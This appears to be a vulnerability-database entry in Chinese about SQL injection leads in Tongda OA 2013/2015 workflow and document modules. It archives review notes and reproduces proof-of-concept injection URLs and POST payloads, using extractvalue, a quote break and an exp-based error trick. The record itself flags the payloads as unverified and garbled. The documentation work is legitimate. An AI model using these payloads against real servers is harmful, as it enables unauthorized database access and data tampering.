---
source: "hatch 补库批 20260928"
title: "通达OA workflow及document多处SQL 注入线索"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "2013/2015"
prerequisites: "未说明"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEoa%20sql%E6%B3%A8%E5%85%A5.md"
category_recommendation: "OA / 通达"
id: "vw-8d96a7d72aa3052e79f3789e"
entity_id: "ve-8d96a7d72aa3052e79f3789e"
schema_version: "1"
---

# 通达OA workflow及document多处SQL 注入线索

## 条目说明

- 对象与具体问题：通达OA；workflow及document多处SQLi线索
- 版本、配置及部署条件：2013/2015
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 三端点混一标题，缺各版本/鉴权/证据
- extractvalue字词被断行，重复MODULE_ID与模糊post记号，不可照抄
- _SERVER覆盖与过滤绕过未解释

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

2013、2015版本

三、复现过程
------------

poc

    http://0-sec.org/general/mytable/intel_view/workflow.php?MAX_COUNT=15 procedure analyse(extrac
    tvalue(rand(),concat(0x3a,database())),1)&TYPE=3&MODULE_SCROLL=false&MODULE_ID=55&
    MODULE_ID=Math.random
    http://0-sec.org/general/document/index.php/recv/register/turn    

    post(_SERVER=&rid=1')
    http://0-sec.org/general/document/index.php/recv/register/insert  

    post:   
    title)values("'"^exp(if(1%3d2,1,710)))#=1&_SERVER
